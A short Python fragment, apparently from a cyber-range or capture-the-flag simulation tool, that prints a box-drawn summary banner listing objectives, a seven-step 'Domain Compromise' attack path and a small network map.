║  Objectives: {len(objectives)} (flags + bas + objectives)             ║
║  Attack Path: Domain Compromise (7 steps)            ║
║  Network map: 4 regions, 8 nodes, 8 edges            ║
╚══════════════════════════════════════════════════════╝
""")
